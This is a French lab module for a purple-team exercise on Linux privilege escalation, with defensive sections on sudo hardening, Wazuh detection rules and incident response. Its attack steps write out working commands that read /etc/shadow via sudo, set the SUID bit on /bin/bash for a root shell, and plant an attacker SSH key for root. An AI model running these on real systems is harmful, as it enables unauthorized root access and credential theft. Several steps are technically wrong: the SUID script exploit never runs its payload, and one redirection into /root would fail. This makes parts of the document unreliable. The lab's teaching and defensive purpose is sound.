# Attaque 4 : Escalade de privilèges (Privilege Escalation)

**Durée estimée :** 1 heure  
**Niveau :** Intermédiaire/Avancé  
**Objectif :** Essayer d'obtenir un accès root à partir d'un compte utilisateur avec privilèges limités

---

## 📋 Objectifs pédagogiques

À l'issue de cette attaque, vous comprendrez :

- Les risques d'une configuration sudo défaillante
- Comment les attaquants utilisent sudo pour escalader les privilèges
- L'importance de l'audit des commandes sensibles
- Comment SELinux limite l'escalade
- La détection des tentatives d'escalade
- Les mesures de prévention

---

## 🎯 Scénario réaliste

L'attaquant a un accès initial au serveur (peut-être via une autre vulnérabilité). Il veut maintenant escalader ses privilèges pour devenir **root** et avoir un contrôle total du système.

Les chemins courants :
1. Configuration sudo défaillante
2. SUID bits mal configurés
3. Fichiers world-writable
4. Kernel exploits
5. Misconfiguration de services

---

## 🛠️ Prérequis

**Accès :**
- Compte utilisateur ordinaire (student, www-data, etc.)
- SSH sur le serveur cible (192.168.1.100)
- Pas d'accès root initialement

**Outils :**
- `sudo`
- `find`
- `cat` / `ls`
- Terminal/SSH

**Configurations à mettre en place (Rôle 1) :**
```bash
# Créer un utilisateur test
sudo useradd -m -s /bin/bash attacker
sudo passwd attacker  # Définir un mot de passe

# Ou utiliser un compte existant
# student / user / www-data
```

---

## ⚙️ Étape 1 : Énumération des permissions sudo (15 min)

### Objectif
Découvrir quelles commandes sudo sont accessibles sans mot de passe.

### Commande

```bash
# Vérifier les permissions sudo de l'utilisateur courant
sudo -l

# Sortie typique SÉCURISÉE :
# Matching Defaults entries for student on web:
#     !visiblepw, always_set_home, match_group_based, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# [sudo] password for student:
```

### Output attendu - INSECURISÉ (pour ce lab)

```
Matching Defaults entries for student on web:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User student may run the following commands without password:
    (root) NOPASSWD: /bin/ls
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/cat
    (ALL) NOPASSWD: /usr/bin/apt-get
    (ALL) NOPASSWD: /bin/chmod
    (ALL) NOPASSWD: /bin/chown
```

### Analyse

Les configurations **DANGEREUSES** incluent :

```
NOPASSWD: /bin/ls              # Inutile mais accès d'énumération
NOPASSWD: /usr/bin/find        # Peut lire tous les fichiers
NOPASSWD: /usr/bin/cat         # Accès aux fichiers sensibles
NOPASSWD: /usr/bin/apt-get     # Installation de packages malveillants
NOPASSWD: /bin/chmod           # Modification des permissions
NOPASSWD: /bin/chown           # Changement de propriétaires
NOPASSWD: ALL                  # Root complet sans mdp!
```

---

## ⚙️ Étape 2 : Exploitation sudo NOPASSWD (15 min)

### Objectif 1 : Accès aux fichiers sensibles

```bash
# Lire /etc/shadow (hashes des mots de passe)
sudo cat /etc/shadow

# Output attendu :
root:!$6$H3x/q9K2$Xm.N/5C...::0:99999:7:::
student:$6$7mK9q/L3$Ym.M/4D...::0:99999:7:::
www-data:*:18000:0:99999:7:::
```

**Impact :** Possibilité de crack des mots de passe hors ligne

### Objectif 2 : Modification des permissions

```bash
# Rendre /bin/bash SUID bit activé (dangereux!)
sudo chmod u+s /bin/bash

# Vérifier
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1234567 Jan 15 11:00 /bin/bash

# Utiliser le bash SUID pour devenir root
/bin/bash -p

# Vérifier que nous sommes root
id
# uid=0(root) gid=1000(student) groups=1000(student)
```

### Objectif 3 : Installation de backdoor via apt-get

```bash
# Si apt-get est en NOPASSWD, on peut installer des packages
# (Dans un vrai lab, c'est dangereux!)

# Simuler l'ajout d'une clé malveillante
sudo cat >> /root/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EA...attacker_public_key... attacker@kali
EOF

# Maintenant, connection SSH directe en tant que root
ssh root@192.168.1.100  # Sans mot de passe!
```

---

## ⚙️ Étape 3 : Recherche de fichiers SUID mal configurés (15 min)

### Objectif
Trouver des binaires SUID que l'on peut exploiter.

### Recherche

```bash
# Trouver tous les fichiers SUID
find / -perm -4000 -type f 2>/dev/null

# Output typique :
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/sbin/mount.nfs
```

### Fichiers SUID DANGEREUX

```bash
# Simuler un script mal configuré
sudo cat > /usr/local/bin/backup.sh << 'EOF'
#!/bin/bash
# Script de backup (SUID bit activé = DANGER!)
tar czf /tmp/backup.tar.gz /var/www
echo "Backup complete"
EOF

# Rendre SUID (ATTENTION: simulation pédagogique!)
sudo chmod 4755 /usr/local/bin/backup.sh

# Lister
ls -la /usr/local/bin/backup.sh
# -rwsr-xr-x 1 root root ... backup.sh

# Exploiter si le script utilise des chemins relatifs
# ou accepte des entrées sans validation
```

### Exploitation de chemins relatifs

```bash
# Si le script SUID utilise: tar czf /tmp/backup.tar.gz /var/www
# On peut créer un tar malveillant

# 1. Créer un shell malveillant
cat > /tmp/malicious.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash_root
chmod 4755 /tmp/bash_root
EOF

# 2. Exécuter le script SUID (ça exécute avec les permissions root!)
/usr/local/bin/backup.sh

# 3. Le script a créé un bash avec SUID bit
ls -la /tmp/bash_root
# -rwsr-xr-x 1 root root ... bash_root

# 4. Devenir root!
/tmp/bash_root -p
id
# uid=0(root) gid=1000(student) groups=1000(student)
```

---

## ⚙️ Étape 4 : Vérifier les services mal configurés (10 min)

### Objectif
Détecter les services tournant en root qui peuvent être exploités.

### Commandes de reconnaissance

```bash
# Voir tous les processus en root
ps aux | grep "^root"

# Sortie attendue :
root         1     0.0  0.2 225624  2324 ?  Ss   10:00   0:00 /sbin/init
root      1234     1.0  0.5 123456  5678 ?  Ss   10:05   0:10 /usr/bin/nginx -g daemon off;
root      1235     0.0  0.1  98765  1234 ?  Ss   10:06   0:00 /usr/sbin/sshd -D
root      1236     0.0  0.2 111111  2222 ?  Ss   10:07   0:00 /opt/wazuh-agent/bin/wazuh-agent
```

### Chercher les services écoutant

```bash
# Ports écoutant en root
sudo netstat -tlnp | grep "^tcp.*LISTEN.*root"

# Ou avec ss
sudo ss -tlnp | grep "tcp.*LISTEN"

# Output :
# LISTEN  0  5  127.0.0.1:5432  0.0.0.0:*  users:(("postgres",pid=1234,fd=5))
# LISTEN  0  128  0.0.0.0:22  0.0.0.0:*  users:(("sshd",pid=1235,fd=3))
# LISTEN  0  128  0.0.0.0:80  0.0.0.0:*  users:(("nginx",pid=1236,fd=10))
```

### Chercher des vulnérabilités connues

```bash
# Version des services
nginx -v
apache2 -v
postgres --version
mysql --version

# Chercher des CVE (Common Vulnerabilities and Exposures)
# Utiliser des outils comme:
# - searchsploit (local)
# - cvedetails.com (online)
```

---

## 🔍 Rôle 1 : Administrateur système & hardening

### Ce que tu dois vérifier et corriger

#### 1. Vérifier la config sudo

```bash
# Afficher la vraie config sudo
sudo cat /etc/sudoers

# Sortie typique SÉCURISÉE :
Defaults use_pty
Defaults logfile="/var/log/sudo.log"
Defaults requiretty
Defaults passwd_timeout=0

root  ALL=(ALL)  ALL
%sudo ALL=(ALL)  ALL
%wheel ALL=(ALL) ALL

# JAMAIS NOPASSWD pour les commandes dangereuses!
```

#### 2. Audit des fichiers SUID

```bash
# Lister tous les SUID
find / -perm -4000 -type f 2>/dev/null > /tmp/suid_baseline.txt

# Comparer régulièrement
find / -perm -4000 -type f 2>/dev/null > /tmp/suid_current.txt
diff /tmp/suid_baseline.txt /tmp/suid_current.txt

# Supprimer les SUID dangereux
sudo chmod u-s /usr/bin/find  # Si SUID activé sans raison
sudo chmod u-s /usr/bin/locate
sudo chmod u-s /usr/bin/strings
```

#### 3. Configurer correctement sudo

```bash
# Utiliser visudo pour éditer /etc/sudoers (plus sûr)
sudo visudo

# Configuration SÉCURISÉE example :
Defaults  use_pty
Defaults  logfile="/var/log/sudo.log"
Defaults  log_input, log_output
Defaults  requiretty
Defaults  passwd_timeout=1
Defaults  timestamp_timeout=5  # Expire après 5 min

# Adminstrateurs
root  ALL=(ALL) ALL
%wheel ALL=(ALL) ALL

# Applications spécifiques (PAS de NOPASSWD si possible!)
www-data ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx
nagios ALL=(ALL) NOPASSWD: /usr/sbin/service

# JAMAIS :
# %sudo ALL=(ALL) NOPASSWD: ALL
# student ALL=(ALL) NOPASSWD: /bin/cat
```

#### 4. Auditer les commandes sensibles

```bash
# Créer un playbook Ansible pour automatiser l'audit
cat > /tmp/suid_audit.sh << 'EOF'
#!/bin/bash

echo "=== SUID Audit Report ==="
date

echo -e "\n[1] World-writable files"
find / -perm -002 -type f 2>/dev/null | head -20

echo -e "\n[2] World-writable directories"
find / -perm -002 -type d 2>/dev/null | head -20

echo -e "\n[3] SUID binaries"
find / -perm -4000 -type f 2>/dev/null

echo -e "\n[4] SGID binaries"
find / -perm -2000 -type f 2>/dev/null

echo -e "\n[5] No owner files"
find / -nouser -o -nogroup 2>/dev/null | head -20

echo -e "\n[6] Recent sudo commands"
sudo tail -50 /var/log/secure | grep sudo

EOF

chmod +x /tmp/suid_audit.sh
/tmp/suid_audit.sh
```

---

## 🛡️ Rôle 2 : SOC / Logs / Détection

### Logs à surveiller

#### Logs sudo

**Fichier :** `/var/log/secure` ou `/var/log/auth.log`

```
Jan 15 11:45:20 web sudo: student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jan 15 11:45:21 web sudo:    student : command not allowed
Jan 15 11:45:25 web sudo: student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/usr/bin/find / -type f -perm -4000
Jan 15 11:45:30 web sudo: student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/bin/chmod 4755 /tmp/shell
```

#### Logs auditd

**Fichier :** `/var/log/audit/audit.log`

```
type=EXECVE msg=audit(1705332320.234:567): argc=3 a0="/usr/bin/sudo" a1="-l" a2="" 
type=CWD msg=audit(1705332320.234:567): cwd="/home/student"
type=SYSCALL msg=audit(1705332320.234:567): arch=c000003e syscall=59 success=yes exit=0 a0=0x4567... ppid=5234 pid=5235 auid=1000 uid=0 gid=0 euid=0 egid=0 fsuid=0 fsgid=0 tty=pts0 ses=5 comm="sudo" exe="/usr/bin/sudo" key="privilege_escalation"

type=EXECVE msg=audit(1705332330.456:789): argc=3 a0="/bin/chmod" a1="4755" a2="/tmp/shell"
type=EXECVE_RESULT msg=audit(1705332330.456:789): arch=c000003e syscall=59 success=yes exit=0
type=PROCTITLE msg=audit(1705332330.456:789): proctitle=636
```

#### Détection d'escalade

```
Pattern à chercher dans les logs :
- "sudo -l"                    -> Énumération des permissions
- "COMMAND=/bin/cat /etc/shadow"  -> Accès aux hashes
- "chmod.*4[0-7][0-7][0-7]"    -> Activation de SUID
- "chown.*root"               -> Changement de propriétaire
- "not allowed"               -> Tentative échouée sudo
```

### Règles Wazuh de détection

**Ajouter au fichier :** `/var/ossec/etc/rules/privilege_escalation.xml`

```xml
<group name="privilege_escalation,sudo_monitoring,">
  <!-- Énumération des permissions sudo -->
  <rule id="100500" level="6">
    <if_sid>5103</if_sid>
    <program_name>sudo</program_name>
    <regex>COMMAND=sudo -l</regex>
    <description>User enumerated sudo permissions</description>
    <group>privilege_escalation</group>
  </rule>

  <!-- Accès aux fichiers sensibles via sudo -->
  <rule id="100501" level="8">
    <if_sid>5103</if_sid>
    <program_name>sudo</program_name>
    <regex>COMMAND=.*(/etc/shadow|/etc/passwd|/root/|/opt/)</regex>
    <description>Sensitive file access via sudo</description>
    <group>privilege_escalation,file_access</group>
  </rule>

  <!-- Modification de permissions SUID -->
  <rule id="100502" level="9">
    <if_sid>5103</if_sid>
    <program_name>sudo</program_name>
    <regex>COMMAND=/bin/chmod.*[2-7][0-7][0-7][0-7]</regex>
    <description>SUID bit modification attempt (CRITICAL)</description>
    <group>privilege_escalation,malware</group>
  </rule>

  <!-- Tentative sudo sans privilèges -->
  <rule id="100503" level="5">
    <if_sid>5103</if_sid>
    <program_name>sudo</program_name>
    <regex>user NOT in sudoers|not allowed</regex>
    <description>Unauthorized sudo command attempt</description>
    <group>unauthorized_access</group>
  </rule>

  <!-- Alerte si 3+ tentatives sudo échouées -->
  <rule id="100504" level="8">
    <if_sid>100503</if_sid>
    <frequency>3</frequency>
    <timeframe>60</timeframe>
    <description>Multiple sudo failures detected (brute force)</description>
    <group>privilege_escalation,brute_force</group>
  </rule>
</group>
```

### Dashboard Wazuh

```
PRIVILEGE ESCALATION ATTEMPT DETECTED

Severity: HIGH 🟠
Rule: 100502 - SUID Bit Modification
Source User: student (UID 1000)
Timestamp: 2024-01-15 11:45:30

Command Attempted:
  sudo chmod 4755 /tmp/shell

Indicators:
✓ User enumerated sudo permissions (rule 100500)
✓ Sensitive file access detected (rule 100501)
✓ SUID modification attempted (rule 100502)
✓ Multiple failures recorded

Timeline:
- 11:45:20 - Enumération: sudo -l
- 11:45:21 - Tentative: cat /etc/shadow (FAILED)
- 11:45:25 - Tentative: find SUID files
- 11:45:30 - SUID modification attempt (BLOCKED by SELinux)

Status: CONTAINED - SELinux prevented escalation
```

---

## 📊 Rôle 3 : Supervision & Incident Response

### Anomalies à surveiller

#### Zabbix/Grafana Metrics

```
Sudo Commands Executed (last 5 min):
Value: 7 commands
Threshold: Normal < 1/5min
Status: ANOMALOUS

Failed Sudo Attempts:
Value: 5 in 60 seconds
Threshold: Normal = 0
Status: CRITICAL

Privilege Changes:
Value: 3 detected
Threshold: Normal = 0
Status: CRITICAL

SUID Modifications:
Value: 1 file changed
Threshold: Normal = 0
Status: CRITICAL
```

### Playbook d'incident response

#### Étape 1 : Confirmer l'incident

```bash
# 1. Vérifier les logs sudo
sudo tail -50 /var/log/secure | grep sudo

# 2. Vérifier les changements SUID
sudo find / -perm -4000 -mtime -1 2>/dev/null

# 3. Vérifier les processus root inhabituels
ps aux | grep -v "^\[" | awk '{print $1}' | sort | uniq -c | sort -rn

# 4. Vérifier Wazuh alerts
curl -X GET \
  "http://localhost:55000/api/events?query=rule.level>=8&rule.id=100502" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

#### Étape 2 : Containment

```bash
# 1. Désactiver l'utilisateur attaquant
sudo usermod -L attacker  # Verrouiller le compte

# 2. Tuer tous les processus de cet utilisateur
sudo pkill -u attacker

# 3. Rétablir les permissions correctes
sudo chmod u-s /tmp/bash_root 2>/dev/null
sudo rm -f /tmp/bash_root
sudo chmod u-s /tmp/shell 2>/dev/null
sudo rm -f /tmp/shell

# 4. Réinitialiser sudo
sudo -k  # Invalider tous les sessions sudo
```

#### Étape 3 : Análysis

```bash
# Générer un rapport complet
cat > /tmp/privesc_incident.md << 'EOF'
# Privilege Escalation Incident Report

## Executive Summary
Unauthorized user attempted to escalate privileges to root via sudo misconfiguration and SUID exploitation.

## Attack Details
- **Attacker:** student user (UID 1000)
- **Target:** root privileges (UID 0)
- **Method 1:** sudo -l enumeration
- **Method 2:** chmod SUID bit on shell binary
- **Method 3:** Attempted root shell execution

## Timeline
- 11:45:20 - Enumeration begins (sudo -l)
- 11:45:25 - File access attempts (/etc/shadow, /etc/passwd)
- 11:45:30 - SUID modification attempt
- 11:45:35 - Incident detected by Wazuh
- 11:45:40 - SELinux blocked execution

## Technical Analysis

### Commands Attempted
1. `sudo -l` - Enumerate permissions
2. `sudo cat /etc/shadow` - Access password hashes
3. `sudo chmod 4755 /tmp/shell` - Enable SUID on attacker shell
4. `./tmp/shell -p` - Execute with elevated privileges

### Root Cause
- Overly permissive sudo configuration
- NOPASSWD for dangerous commands
- Lack of file integrity monitoring

## Detection & Response Timeline
- **Detection:** 11:45:35 (15 seconds after attack)
- **Analysis:** 11:45:40
- **Containment:** 11:46:00
- **Mitigation:** 11:46:30

## Impact Assessment
- **Confidentiality:** NOT compromised (SELinux blocked execution)
- **Integrity:** NOT compromised (no files modified)
- **Availability:** NOT impacted (service intact)

**Severity:** MEDIUM (attack blocked by SELinux, no successful escalation)

## Remediation
1. ✅ Fix sudo configuration (remove NOPASSWD)
2. ✅ Implement file integrity monitoring
3. ✅ Enable SELinux enforcing (already active)
4. ✅ Audit all SUID binaries
5. ✅ Lock compromised user account

## Prevention
- Regular security audits
- File integrity monitoring (AIDE, Tripwire)
- Minimal privilege principle
- Two-factor authentication
- Regular security training

**Status:** RESOLVED - No successful escalation
EOF

cat /tmp/privesc_incident.md
```

#### Étape 4 : Hardening futur

```bash
# Script de hardening automatisé
cat > /tmp/harden_privesc.sh << 'EOF'
#!/bin/bash

echo "[*] Hardening Privilege Escalation..."

# 1. Fix sudo configuration
sudo sed -i 's/^.*NOPASSWD.*$//' /etc/sudoers.d/*
echo "Defaults use_pty" | sudo tee -a /etc/sudoers
echo "Defaults logfile=\"/var/log/sudo.log\"" | sudo tee -a /etc/sudoers

# 2. Remove unnecessary SUID bits
DANGEROUS_SUID=(
    "/usr/bin/find"
    "/usr/bin/locate"
    "/usr/bin/strings"
    "/usr/bin/rsh"
)

for file in "${DANGEROUS_SUID[@]}"; do
    if [ -f "$file" ]; then
        sudo chmod u-s "$file" && echo "[-] SUID removed: $file"
    fi
done

# 3. Enable file integrity monitoring
sudo apt-get install aide aide-common
sudo aideinit

# 4. Check SELinux status
sudo getenforce

# 5. Enable auditd
sudo systemctl enable auditd
sudo systemctl start auditd

echo "[+] Hardening complete"
EOF

chmod +x /tmp/harden_privesc.sh
```

---

## ✅ Checklist de validation

### Point 1 : Attaque exécutée
- [ ] Énumération sudo réussie (sudo -l)
- [ ] Au moins 3 méthodes d'escalade testées
- [ ] Tentatives documentées dans les logs

### Point 2 : Détection confirmée
- [ ] Alerte Wazuh generée (rule level 8+)
- [ ] Logs sudo montrent les tentatives
- [ ] Auditd a enregistré les actions

### Point 3 : Réaction confirmée
- [ ] Escalade bloquée (SELinux ou sudo)
- [ ] Incident documenté
- [ ] Config sudo corrigée

---

## 📝 Commandes utiles - Mémo rapide

```bash
# Énumération
sudo -l
find / -perm -4000 -type f 2>/dev/null
ps aux | grep "^root"

# Exploitation
sudo cat /etc/shadow
sudo chmod 4755 /tmp/shell
/tmp/shell -p

# Audit
sudo visudo -c
sudo grep -i "nopasswd" /etc/sudoers*
sudo find / -perm -4000 -mtime -1 2>/dev/null

# Detection Wazuh
sudo tail -f /var/log/secure | grep -i sudo
sudo ausearch -m EXECVE | grep chmod
```

---

## 🔗 Références internes

- [03_upload_malveillant.md](./03_upload_malveillant.md) → Attaque précédente
- [05_connexion_hors_horaires.md](./05_connexion_hors_horaires.md) → Prochaine attaque
- [README.md](../README.md) → Retour au projet

---

## 💡 Points clés à retenir

1. **Jamais de NOPASSWD pour commandes dangereuses** → C'est une porte ouverte
2. **Auditer sudo régulièrement** → `sudo -l` sur tous les comptes
3. **SELinux sauve des vies** → Le garder en enforcing mode
4. **SUID bits = danger** → Audit régulier obligatoire
5. **Logging = détection** → Wazuh doit monitorer sudo 24/7

